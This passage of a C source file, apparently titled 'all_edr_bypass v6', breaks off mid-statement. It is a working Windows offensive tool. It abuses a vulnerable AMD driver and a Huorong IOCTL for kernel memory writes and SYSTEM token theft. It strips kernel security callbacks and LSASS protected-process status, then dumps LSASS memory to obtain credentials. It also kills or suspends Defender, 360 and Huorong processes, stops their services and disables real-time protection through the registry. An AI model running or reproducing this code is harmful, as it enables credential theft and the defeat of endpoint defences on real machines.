        STARTUPINFOA si2={sizeof(si2)}; PROCESS_INFORMATION pi2={};
        for(int attempt=0;attempt<20;attempt++){
            /* spawn cmd /c exit → PsCreate callbacks → wakes sysdiag watchdog → checks kill sw */
            if(CreateProcessA(NULL,(LPSTR)"cmd /c exit",NULL,NULL,FALSE,
                              CREATE_NO_WINDOW,NULL,NULL,&si2,&pi2)){
                WaitForSingleObject(pi2.hProcess,80);
                CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
            } else {
                Sleep(100);
            }
            Sleep(10);
        }
        printf("  [*] Kill switch phase done (2s total)\n");
    }
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  RESTORE ALL + CTRL HANDLER
 * ══════════════════════════════════════════════════════════════════════ */

static volatile int g_anything_applied=0;

static void restore_all(void)
{
    if(!g_anything_applied) return;
    printf("\n[RESTORE] Restoring all...\n");
    hrdevmon_irp_restore();
    dkom_restore();
    ci_opts_restore();
    ppl_restore();
    cm_restore();
    wfp_restore();
    etw_restore();
    flt_restore();
    ob_restore();
    for(int i=0;i<3;i++) ps_restore(&g_ps[i]);
    wk_restore();
    cache_evict_multiccd();
    g_anything_applied=0;
    printf("[RESTORE] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||ev==CTRL_CLOSE_EVENT||
       ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_anything_applied){
            printf("\n[!] Emergency restore...\n"); fflush(stdout);
            restore_all(); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

/* ══════════════════════════════════════════════════════════════════════
 * §9b  INLINE VERIFICATION TESTS
 *
 * Run immediately after all bypasses are applied, before restore.
 * No external process needed — minimises the bypass window.
 * ══════════════════════════════════════════════════════════════════════ */

#define IT_PASS(f,...) printf("  \033[32m[PASS]\033[0m " f "\n",##__VA_ARGS__)
#define IT_FAIL(f,...) printf("  \033[31m[FAIL]\033[0m " f "\n",##__VA_ARGS__)
#define IT_WARN(f,...) printf("  \033[33m[WARN]\033[0m " f "\n",##__VA_ARGS__)

static void it_ps(void)
{
    printf("\n[T1] Ps* Notify — spawn process, check EDR doesn't terminate it\n");
    STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi={0};
    if(CreateProcessA("C:\\Windows\\System32\\whoami.exe",NULL,
                      NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        WaitForSingleObject(pi.hProcess,2000);
        DWORD ec=STILL_ACTIVE; GetExitCodeProcess(pi.hProcess,&ec);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if(ec!=STILL_ACTIVE) IT_PASS("Process ran and exited — Ps* notify DISABLED");
        else                  IT_WARN("Process still running after 2s");
    } else IT_FAIL("CreateProcess err=%lu",GetLastError());
}

static HANDLE it_ob(DWORD lsass_pid)
{
    printf("\n[T2] OB + PPL — OpenProcess(LSASS, PROCESS_ALL_ACCESS)\n");
    printf("     LSASS PID=%lu  NtQIP_prot=0x%02X  OFF_PROT=0x%X\n",
           (unsigned long)lsass_pid, g_lsass_prot_api, g_ep_off_prot);

    /* Diagnostic: PROCESS_QUERY_LIMITED_INFORMATION is always allowed for PPL.
     * If this ALSO fails → something BELOW PPL is blocking (IRP hook, etc.) */
    HANDLE hq = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsass_pid);
    if (hq) {
        printf("     PROCESS_QUERY_LIMITED_INFORMATION: OK (PPL layer passed)\n");
        CloseHandle(hq);
    } else {
        DWORD eq = GetLastError();
        printf("     PROCESS_QUERY_LIMITED_INFORMATION: FAIL err=%lu "
               "→ IRP-level hook or device filter blocking ALL access\n", eq);
    }

    HANDLE h = NULL;
    uint8_t zero = 0;

    if(g_ppl_applied && g_lsass_prot_api && g_lsass_ep.valid){
        /* ── Fast path: sysdiag IOCTL write + immediate OpenProcess ──
         * InterlockedExchange (LOCK XCHG) causes MESI cache-line invalidation
         * on all cores — Protection=0 is visible to kernel immediately.
         * Tight loop (100 attempts, ~few μs each) easily beats the thread-based
         * watchdog whose KeDelayExecutionThread sleep interval is >>100μs. */
        if(!g_lsass_eproc_va && g_lsass_pid)
            g_lsass_eproc_va = sd_find_lsass_eproc_va(lsass_pid);

        if(g_lsass_eproc_va && sd_open()){
            uint64_t prot_va = g_lsass_eproc_va + g_ep_off_prot;
            printf("     [SD-T2] Fast path: prot_va=0x%016llX\n",
                   (unsigned long long)prot_va);
            for(int attempt = 0; attempt < 100 && !h; attempt++){
                /* 4-byte atomic: LOCK XCHG32 invalidates WB-cached lines on all
                 * cores → kernel sees 0x00 on next WB read, no eviction needed. */
                sd_write_byte_atomic4(prot_va, 0);
                h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
                if(!h && GetLastError() != 5) break;
            }
            if(h) printf("     [SD-T2] OpenProcess succeeded via IOCTL write\n");
            else  printf("     [SD-T2] Fast path failed (%lu) — trying phys+evict\n",
                         GetLastError());
        }

        /* ── Slow path: AMD driver phys_write + cache eviction ──
         * Fallback when sysdiag IOCTL is unavailable or fast path lost the race. */
        if(!h){
            uint64_t pa_prot = g_lsass_eproc_va
                ? va_to_pa(g_lsass_eproc_va + g_ep_off_prot) : 0;
            if(!pa_prot) pa_prot = g_lsass_ep.pa + g_ep_off_prot;

            h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
            if(!h && GetLastError()==5){
                printf("     [phys retry] first try failed, doing write+evict retries...\n");
                for(int attempt=0; attempt<5 && !h; attempt++){
                    phys_write(pa_prot, &zero, 1);
                    cache_evict_all_cores();
                    h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
                    if(!h && GetLastError()!=5) break;
                }
                if(h) printf("     [phys retry] succeeded after eviction\n");
            }
        }
    } else {
        h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    }

    if(h) IT_PASS("Handle obtained — OB+PPL bypassed");
    else {
        DWORD e=GetLastError();
        if(e==5) {
            if(!hq)
                IT_FAIL("Blocked at IRP level (hrdevmon.sys?) — need IRP unhook");
            else if(g_lsass_prot_api)
                IT_FAIL("PPL still active (prot=0x%02X, write didn't reach kernel — cache coherency issue)",g_lsass_prot_api);
            else
                IT_FAIL("OB still stripping rights (access denied, not PPL)");
        } else IT_FAIL("OpenProcess err=%lu",e);
    }
    return h;
}

static void it_etw(HANDLE hlsass)
{
    printf("\n[T3] ETW-TI — ReadProcessMemory into LSASS\n");
    if(!hlsass){IT_WARN("Skipped (no LSASS handle)");return;}
    uint8_t buf[64]={0}; SIZE_T br=0;
    if(ReadProcessMemory(hlsass,(LPCVOID)0x7FFE0000,buf,sizeof buf,&br)&&br>0)
        IT_PASS("ReadProcessMemory ok (%zu bytes)",(size_t)br);
    else
        IT_FAIL("ReadProcessMemory err=%lu",GetLastError());
}

static void it_flt(void)
{
    printf("\n[T4] Minifilter — write PE file, check EDR doesn't delete it\n");
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH]; snprintf(path,sizeof path,"%s\\edr_test_%lu.exe",tmp,(unsigned long)GetCurrentProcessId());
    HANDLE hf=CreateFileA(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("CreateFile err=%lu",GetLastError());return;}
    const uint8_t mz[64]={'M','Z',0x90,0,3,0,0,0,4,0,0,0,0xFF,0xFF,0,0,
                           0xb8,0,0,0,0,0,0,0,0x40,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0x40,0,0,0};
    DWORD wr=0; WriteFile(hf,mz,sizeof mz,&wr,NULL); CloseHandle(hf);
    Sleep(800);
    hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("File deleted by EDR");return;}
    uint8_t rb[2]={0}; DWORD rr=0; ReadFile(hf,rb,2,&rr,NULL); CloseHandle(hf);
    DeleteFileA(path);
    if(rb[0]=='M'&&rb[1]=='Z') IT_PASS("PE file survived — minifilter DISABLED");
    else                        IT_FAIL("File content modified — minifilter active");
}

static void it_cm(void)
{
    printf("\n[T5] CM callback — write to HKCU\\SOFTWARE\\BypassTest\n");
    HKEY hk;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest",0,NULL,
                       REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hk,NULL)!=ERROR_SUCCESS)
    {IT_FAIL("RegCreateKey err=%lu",GetLastError());return;}
    DWORD v=0xDEADBEEF;
    LSTATUS s=RegSetValueExA(hk,"TestValue",0,REG_DWORD,(BYTE*)&v,4);
    RegCloseKey(hk);
    RegDeleteKeyA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest");
    if(s==ERROR_SUCCESS) IT_PASS("RegSetValueEx ok — CmCallback DISABLED");
    else                 IT_FAIL("RegSetValueEx err=%ld",s);
}

static void it_dump(HANDLE hlsass, DWORD lsass_pid)
{
    printf("\n[T6] LSASS dump — MiniDumpWriteDump (gold standard)\n");
    if(!hlsass){IT_WARN("Skipped (no LSASS handle)");return;}
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH]; snprintf(path,sizeof path,"%s\\lsass_%lu.dmp",tmp,(unsigned long)GetCurrentProcessId());
    HANDLE hf=CreateFileA(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("CreateFile err=%lu",GetLastError());return;}
    BOOL ok=MiniDumpWriteDump(hlsass,lsass_pid,hf,
                              MiniDumpWithFullMemory|MiniDumpWithHandleData,
                              NULL,NULL,NULL);
    DWORD e=GetLastError();
    LARGE_INTEGER fsz={0}; GetFileSizeEx(hf,&fsz);
    CloseHandle(hf);
    if(ok) IT_PASS("MiniDumpWriteDump SUCCESS (%lld MB) — ALL bypasses confirmed!",(long long)(fsz.QuadPart>>20));
    else {
        if(e==5)         IT_FAIL("Access Denied — PPL/OB still blocking");
        else if(e==0x57) IT_FAIL("Invalid param (0x57) — ETW-TI may be blocking");
        else             IT_FAIL("MiniDumpWriteDump err=0x%08lX",e);
    }
}

/* Kill a named process if running.
 * Try TerminateProcess; if OB callback blocks it (err=5), fall back to
 * NtSuspendProcess (sysdiag typically only strips PROCESS_TERMINATE, not SUSPEND_RESUME).
 * Suspended process cannot respond to file-change notifications → EICAR survives. */
static int kill_process_by_name(const char *name)
{
    typedef NTSTATUS(NTAPI*PFN_SUSP)(HANDLE);
    static PFN_SUSP pfnSuspend=NULL;
    if(!pfnSuspend) pfnSuspend=(PFN_SUSP)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),"NtSuspendProcess");

    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe={sizeof pe}; int killed=0;
    if(Process32First(snap,&pe)) do {
        if(_stricmp(pe.szExeFile,name)==0){
            printf("      [kill] found %s PID=%lu\n",name,(unsigned long)pe.th32ProcessID);
            HANDLE h=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
            if(!h){
                printf("      [kill] OpenProcess(TERMINATE) err=%lu — trying SUSPEND\n",GetLastError());
            } else {
                if(TerminateProcess(h,1)){ killed++; CloseHandle(h); continue; }
                printf("      [kill] TerminateProcess err=%lu — trying SUSPEND\n",GetLastError());
                CloseHandle(h);
            }
            /* Fallback: suspend all threads so HipsDaemon can't process notifications */
            if(pfnSuspend){
                HANDLE hs=OpenProcess(PROCESS_SUSPEND_RESUME,FALSE,pe.th32ProcessID);
                if(hs){
                    NTSTATUS st=pfnSuspend(hs);
                    if(st==0){
                        printf("      [kill] NtSuspendProcess OK — %s frozen\n",name);
                        killed++;
                    } else {
                        printf("      [kill] NtSuspendProcess st=0x%08X\n",(unsigned)st);
                    }
                    CloseHandle(hs);
                } else {
                    printf("      [kill] OpenProcess(SUSPEND_RESUME) err=%lu\n",GetLastError());
                }
            }
        }
    } while(Process32Next(snap,&pe));
    CloseHandle(snap);
    return killed;
}

/* T7: EICAR — write official AV test string, check WdFilter doesn't delete it.
 * String is split across two literals so this source file doesn't trigger AV. */
static void it_eicar(void)
{
    printf("\n[T7] EICAR — write AV test string, check AV doesn't delete it\n");

    /* ── [A] Huorong user-mode scanner kill — requires OB callbacks zeroed at [3/8] ── */
    int kd=kill_process_by_name("HipsDaemon.exe");
    int ks=kill_process_by_name("SysDiag.exe");
    if(kd||ks){
        printf("    Killed/suspended Huorong: HipsDaemon=%d SysDiag=%d\n",kd,ks);
        Sleep(600);
    } else {
        printf("    Huorong scanners not found / already stopped\n");
    }

    /* ── [B] 360 Total Security user-mode process kill ── */
    {
        int k360d = kill_process_by_name("ZhuDongFangYu.exe"); /* 主动防御 HIPS daemon */
        int k360s = kill_process_by_name("360sd.exe");
        int k360r = kill_process_by_name("360rp.exe");         /* real-time protection */
        int k360q = kill_process_by_name("QHSafeTray.exe");
        int k360t = kill_process_by_name("360Tray.exe");
        int k360f = kill_process_by_name("360safe.exe");
        int k360a = kill_process_by_name("360AntiHack.exe");
        int k360m = kill_process_by_name("360HealthService.exe");
        int k360n = kill_process_by_name("QHNetWorkService64.exe");
        if(k360d||k360s||k360r||k360q||k360t||k360f||k360a||k360m||k360n){
            printf("    Killed/suspended 360: ZDY=%d sd=%d rp=%d tray=%d safe=%d antihk=%d health=%d net=%d\n",
                   k360d,k360s,k360r,(k360q||k360t),k360f,k360a,k360m,k360n);
            Sleep(600);
        } else {
            printf("    360 processes not found / already stopped\n");
        }
    }

    /* ── [C] Stop AV services via SCM ── */
    {
        SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CONNECT);
        if(!scm){ printf("    OpenSCManager err=%lu\n",GetLastError()); }
        else {
            /* Windows Defender */
            static const char *wdsvcs[]={"WinDefend","WdNisSvc","SecurityHealthService",NULL};
            for(int si=0;wdsvcs[si];si++){
                SC_HANDLE svc=OpenServiceA(scm,wdsvcs[si],SERVICE_STOP|SERVICE_QUERY_STATUS);
                if(!svc) continue;
                SERVICE_STATUS ss={0};
                if(ControlService(svc,SERVICE_CONTROL_STOP,&ss))
                    printf("    Stopped WD svc: %s\n",wdsvcs[si]);
                else
                    printf("    %s stop err=%lu (state=%lu)\n",wdsvcs[si],GetLastError(),ss.dwCurrentState);
                CloseServiceHandle(svc);
            }
            /* 360 Total Security */
            static const char *svcs360[]={"360sd","360rp","360AntiHack","360NetFlt",
                                          "360FsFlt","360AvFlt","360SelfProtect",
                                          "360protect","BAPIDRV",NULL};
            for(int si=0;svcs360[si];si++){
                SC_HANDLE svc=OpenServiceA(scm,svcs360[si],SERVICE_STOP|SERVICE_QUERY_STATUS);
                if(!svc) continue;
                SERVICE_STATUS ss={0};
                if(ControlService(svc,SERVICE_CONTROL_STOP,&ss))
                    printf("    Stopped 360 svc: %s\n",svcs360[si]);
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }
    }

    /* ── [D] Windows Defender process kill (PPL bypass path) ── */
    int km=kill_process_by_name("MsMpEng.exe");
    int kc=kill_process_by_name("MsMpEngCP.exe");
    if(km||kc) printf("    Terminated WD: MsMpEng=%d MsMpEngCP=%d\n",km,kc);
    else        printf("    MsMpEng: service-stopped or PPL-protected\n");

    /* ── [E] Registry disable — belt-and-suspenders ── */
    /* Windows Defender */
    {
        HKEY hk=NULL;
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                         0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
            DWORD v=1;
            RegSetValueExA(hk,"DisableRealtimeMonitoring",0,REG_DWORD,(BYTE*)&v,4);
            RegSetValueExA(hk,"DisableBehaviorMonitoring",0,REG_DWORD,(BYTE*)&v,4);
            RegSetValueExA(hk,"DisableOnAccessProtection",0,REG_DWORD,(BYTE*)&v,4);
            RegSetValueExA(hk,"DisableScanOnRealtimeEnable",0,REG_DWORD,(BYTE*)&v,4);
            RegCloseKey(hk);
            printf("    WD registry: real-time protection disabled\n");
        }
    }
    /* 360 Total Security registry disable */
    {
        static const char *keys360[]={
            "SOFTWARE\\360Safe\\360SD\\Protect",
            "SOFTWARE\\360\\360Safe\\SafeGuard",
            "SOFTWARE\\360\\360sd",
            "SOFTWARE\\360Safe",
            NULL
        };
        for(int ki=0;keys360[ki];ki++){
            HKEY hk=NULL;
            if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,keys360[ki],0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
                DWORD v=0;
                RegSetValueExA(hk,"RealTimeProtect",0,REG_DWORD,(BYTE*)&v,4);
                RegSetValueExA(hk,"Enable",0,REG_DWORD,(BYTE*)&v,4);
                RegSetValueExA(hk,"ActiveDefend",0,REG_DWORD,(BYTE*)&v,4);
                RegCloseKey(hk);
                printf("    360 registry: disabled %s\n",keys360[ki]);
            }
        }
    }

    Sleep(2000); /* let services stop and pending kernel scan callbacks drain */
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp, tmp);
    char path[MAX_PATH];
    snprintf(path, sizeof path, "%s\\eicar_%lu.com", tmp, (unsigned long)GetCurrentProcessId());

    /* Build EICAR string at runtime from XOR-encoded bytes (key=0x13) — no literal in binary. */
    static const unsigned char enc[]={
        0x4B,0x26,0x5C,0x32,0x43,0x36,0x53,0x52,0x43,0x48,0x27,0x4F,0x43,0x49,0x4B,
        0x26,0x27,0x3B,0x43,0x4D,0x3A,0x24,0x50,0x50,0x3A,0x24,0x6E,0x37,0x56,0x5A,
        0x50,0x52,0x41,0x3E,0x40,0x47,0x52,0x5D,0x57,0x52,0x41,0x57,0x3E,0x52,0x5D,
        0x47,0x5A,0x45,0x5A,0x41,0x46,0x40,0x3E,0x47,0x56,0x40,0x47,0x3E,0x55,0x5A,
        0x5F,0x56,0x32,0x37,0x5B,0x38,0x5B,0x39 };
    char eicar[256];
    for(int k=0;k<(int)(sizeof enc);k++) eicar[k]=(char)(enc[k]^0x13);
    eicar[sizeof enc]='\0';

    HANDLE hf = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("    CreateFile(%s) err=%lu — trying C:\\Users\\Public\\\n",path,GetLastError());
        snprintf(path,sizeof path,"C:\\Users\\Public\\eicar_%lu.com",(unsigned long)GetCurrentProcessId());
        hf = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
        if(hf==INVALID_HANDLE_VALUE){IT_FAIL("CreateFile err=%lu",GetLastError());return;}
    }
    DWORD wr = 0;
    WriteFile(hf, eicar, (DWORD)strlen(eicar), &wr, NULL);
    /* Flush buffers so minifilter IRP_MJ_WRITE fires now, not on deferred close */
    FlushFileBuffers(hf);
    CloseHandle(hf);

    /* 2.5s window: WdFilter scans on IRP_MJ_CLEANUP PostOp (~100ms),
     * 360AvFlt scans on WRITE (~50ms), Huorong scans on CLEANUP (~200ms).
     * Extra margin for delayed user-mode scanners. */
    Sleep(2500);

    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        DWORD e=GetLastError();
        if(e==2)
            IT_FAIL("EICAR deleted by AV (file gone) — WdFilter/360AvFlt/sysdiag still active");
        else if(e==5)
            IT_FAIL("EICAR access denied (err=5) — AV quarantined/locked the file");
        else
            IT_FAIL("EICAR check err=%lu",e);
        return;
    }
    /* Verify content wasn't modified (some AV quarantine in-place) */
    uint8_t rbuf[8]={0}; DWORD rr=0;
    ReadFile(hf,rbuf,sizeof rbuf,&rr,NULL);
    CloseHandle(hf);
    DeleteFileA(path);
    if(rr>0 && rbuf[0]=='X')
        IT_PASS("EICAR survived 2.5s intact — AV real-time protection DISABLED");
    else
        IT_WARN("File exists but content unexpected (rr=%lu rb0=0x%02X) — may be quarantined in-place",(unsigned long)rr,rbuf[0]);
}

static void run_inline_tests(DWORD lsass_pid)
{
    printf("\n======================================================\n");
    printf(" PHASE 4: VERIFY  (tests run while bypass is active)\n");
    printf("======================================================\n");
    fflush(stdout);

    HANDLE hlsass = it_ob(lsass_pid); fflush(stdout);
    it_etw(hlsass); fflush(stdout);
    it_dump(hlsass, lsass_pid); fflush(stdout);
    if(hlsass){ CloseHandle(hlsass); hlsass=NULL; }

    it_eicar(); fflush(stdout);
    it_flt();   fflush(stdout);
    it_cm();    fflush(stdout);
    it_ps();    fflush(stdout);

    printf("\n======================================================\n");
    printf(" VERIFY COMPLETE — restoring immediately\n");
    printf("======================================================\n\n");
    fflush(stdout);
}

/* ══════════════════════════════════════════════════════════════════════
 * §9  DISPLAY HELPERS
 * ══════════════════════════════════════════════════════════════════════ */

static void print_edr_drivers(void)
{
    char seen[96][64]; int ns=0;

    /* ADD_SEEN: use is_edr_target so Microsoft OS / HW-vendor false positives
     * from callback scans don't pollute the inventory display */
    #define ADD_SEEN(n) do { \
        if(is_edr_target(n)){ \
            int _f=0; for(int _j=0;_j<ns;_j++) if(_stricmp(seen[_j],(n))==0){_f=1;break;} \
            if(!_f&&ns<96){strncpy(seen[ns],(n),63);seen[ns++][63]='\0';} \
        } \
    } while(0)

    /* From callback scans */
    for(int i=0;i<g_ob_n;i++)      ADD_SEEN(g_ob[i].drv);
    for(int i=0;i<g_flt_n_grp;i++) ADD_SEEN(g_flt_grp[i].driver);
    for(int i=0;i<g_cm_n;i++)      ADD_SEEN(g_cm[i].drv);
    for(int i=0;i<g_wfp_n;i++)     ADD_SEEN(g_wfp[i].drv);
    for(int i=0;i<g_wk_n;i++)      ADD_SEEN(g_wk[i].drv);

    /* Module list: only add known/suspected EDR products */
    for(int i=1;i<g_nmods;i++) ADD_SEEN(g_mods[i].name);
    #undef ADD_SEEN

    printf("\n  %-28s  %-7s  %s\n","Driver","In scan","Publisher");
    printf("  %.*s\n",72,"------------------------------------------------------------------------");
    for(int i=0;i<ns;i++){
        /* Was this driver found in any callback scan? */
        int in_scan=0;
        for(int j=0;j<g_ob_n&&!in_scan;j++)      if(_stricmp(g_ob[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_flt_n_grp&&!in_scan;j++) if(_stricmp(g_flt_grp[j].driver,seen[i])==0) in_scan=1;
        for(int j=0;j<g_cm_n&&!in_scan;j++)      if(_stricmp(g_cm[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_wfp_n&&!in_scan;j++)     if(_stricmp(g_wfp[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_wk_n&&!in_scan;j++)      if(_stricmp(g_wk[j].drv,seen[i])==0) in_scan=1;

        const char *co=get_driver_company(seen[i]);
        printf("  %-28s  %-7s  %s\n",
               seen[i],
               in_scan ? "YES" : "no  ←",
               co?co:"(no version info)");
        if(!in_scan)
            printf("    [!] Not in any scan — may use IRP hooks or device filters\n");
    }
    if(!ns) printf("    (none — no non-system drivers loaded)\n");
}

/* ══════════════════════════════════════════════════════════════════════
 * §10  MAIN
 * ══════════════════════════════════════════════════════════════════════ */

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    SetConsoleOutputCP(CP_UTF8);
    /* Enable ANSI VT escape sequences (needed on Win10 cmd.exe) */
    {HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);DWORD m=0;
     if(GetConsoleMode(h,&m)) SetConsoleMode(h,m|0x0004|0x0008);}

    printf("=== all_edr_bypass v6 ===\n\n");

    enable_debug_privilege();

    /* Open driver */
    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        DWORD amd_err=GetLastError();
        printf("[-] Cannot open AMDRyzenMasterDriverV20: err=%lu\n",amd_err);
        if(amd_err==5){
            /* Access denied — try sysdiag token theft (Huorong self-exploitation LPE).
             * sysdiag IOCTL D:P(A;;GA;;;WD) → any user.  Replace our token → SYSTEM. */
            printf("[*] Attempting LPE via Huorong sysdiag IOCTL (no admin needed)...\n");
            /* We need g_nt_va/g_nt_pe for sd_elevate_to_system — bootstrap early */
            if(g_nmods==0) load_module_map();
            if(g_nmods>0 && !g_nt_pe){
                uint64_t nt_va0=(uint64_t)(uintptr_t)g_mods[0].base;
                char nt_path[512]={0};
                {
                    MOD_LIST *ml0=get_module_list();
                    if(ml0){
                        const char *fn=ml0->Modules[0].FullPathName+ml0->Modules[0].OffsetToFileName;
                        char sd_[MAX_PATH]; GetSystemDirectoryA(sd_,sizeof sd_);
                        snprintf(nt_path,sizeof nt_path,"%s\\%s",sd_,fn);
                        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
                            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sd_);
                        free(ml0);
                    }
                }
                if(nt_path[0]){
                    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
                    if(hf!=INVALID_HANDLE_VALUE){
                        DWORD pe_sz=GetFileSize(hf,NULL);
                        uint8_t *pe=(uint8_t*)malloc(pe_sz); DWORD rd=0;
                        ReadFile(hf,pe,pe_sz,&rd,NULL); CloseHandle(hf);
                        g_nt_pe=pe; g_nt_pe_sz=pe_sz;
                        if(nt_va0==0){
                            /* Win11 25H2: NtQSI(11) zeroes ImageBase for non-admin.
                             * Use FILE_OBJECT→DRIVER_OBJECT chain via sysdiag to find ntoskrnl. */
                            printf("[*] NtQSI(11) zeroed base — finding ntoskrnl via DRIVER_OBJECT chain...\n");
                            nt_va0=sd_find_nt_base_via_driver_chain();
                        }
                        g_nt_va=nt_va0;
                        printf("[*] ntoskrnl VA=0x%016llX  disk=%luB\n",(unsigned long long)nt_va0,(unsigned long)pe_sz);
                    }
                }
            }
            if(sd_elevate_to_system()){
                printf("[+] LPE succeeded — retrying AMD driver...\n");
                g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                                  FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
            }
        }
        if(g_dev==INVALID_HANDLE_VALUE){
            printf("[-] AMD driver inaccessible — is AMDRyzenMasterDriverV20 loaded?\n"); return 1;
        }
    }
    printf("[+] AMD driver opened\n");

    /* Physical ranges */
    load_ranges();
    printf("[+] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No physical ranges\n");CloseHandle(g_dev);return 1;}

    /* Module map */
    load_module_map();
    printf("[+] Kernel modules: %d\n",g_nmods);

    /* Find kernel CR3.  Two methods:
     * 1. Self-referencing PML4/PML5 scan (fast but limited to first 64MB)
     * 2. System EPROCESS DirectoryTableBase scan (reliable, full RAM scan)
     * After each method, verify by confirming va_to_pa(nt_va) yields a sane PA.
     * g_nt_pa is not set yet here so we use find_ntoskrnl_pa for verification
     * only if paging detection printed success; otherwise we trust the fallback
     * and warn that va_to_pa may be unreliable (FLT Method A.6 works without it). */
    {
        uint64_t nt_va0 = g_nmods>0 ? g_mods[0].base : 0;
        g_kernel_cr3 = find_kernel_cr3(nt_va0);
        if(g_kernel_cr3){
            printf("[+] Kernel CR3 (self-ref scan): 0x%016llX\n",(unsigned long long)g_kernel_cr3);
            detect_paging_mode(nt_va0);
        }
        /* If self-ref scan failed OR va_to_pa still doesn't work → use EPROCESS method */
        if(!g_kernel_cr3 || (!g_paging_5l && !va_to_pa(nt_va0))){
            printf("[*] CR3 self-ref scan unreliable — scanning System EPROCESS...\n");
            uint64_t cr3_ep = find_cr3_from_system_eprocess();
            if(cr3_ep){
                g_kernel_cr3 = cr3_ep;
                detect_paging_mode(nt_va0);
            }
        }
        /* Final va_to_pa sanity check — if still broken, warn but continue.
         * FLT Method A.6 (pool writes) + CM/WFP/OB pool writes work without va_to_pa.
         * Only Method A (list-unlink) and B.1 (code-patch via page walk) are affected. */
        if(g_kernel_cr3 && nt_va0 && !va_to_pa(nt_va0)){
            printf("[!] va_to_pa broken after CR3 detection — FLT list-unlink & code-patch disabled\n");
            printf("    FLT Method A.6 (pool redirect) + B.2 (prologue scan) still active.\n");
        }
        if(g_kernel_cr3)
            printf("[+] Kernel CR3 active: 0x%016llX  paging=%s\n\n",
                   (unsigned long long)g_kernel_cr3, g_paging_5l?"5-level(LA57)":"4-level(LA48)");
        else
            printf("[!] Kernel CR3 not found — minifilter will use code-patch fallback\n\n");
    }

    /* ntoskrnl */
    MOD_LIST *ml=get_module_list();
    if(!ml){printf("[-] Module list failed\n");CloseHandle(g_dev);return 1;}
    uint64_t nt_va=(uint64_t)ml->Modules[0].ImageBase;
    uint64_t nt_size=(uint64_t)ml->Modules[0].ImageSize;
    char nt_path[512]={0};
    {
        const char *fn=ml->Modules[0].FullPathName+ml->Modules[0].OffsetToFileName;
        char sd[MAX_PATH]; GetSystemDirectoryA(sd,sizeof sd);
        snprintf(nt_path,sizeof nt_path,"%s\\%s",sd,fn);
        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
